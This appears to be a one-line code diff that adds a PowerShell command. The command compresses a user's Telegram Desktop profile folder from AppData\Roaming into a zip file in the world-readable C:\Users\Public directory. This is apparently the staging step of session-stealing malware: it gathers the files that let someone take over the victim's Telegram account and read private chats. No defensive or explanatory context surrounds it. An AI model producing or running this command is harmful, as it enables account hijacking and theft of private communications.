@@ -1,0 +1,1 @@
+powershell.exe -nologo -noprofile -command "& { Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::CreateFromDirectory('C:\Users\Igor\Appdata\Roaming\Telegram Desktop','C:\Users\Public\telegram.zip'); }" 
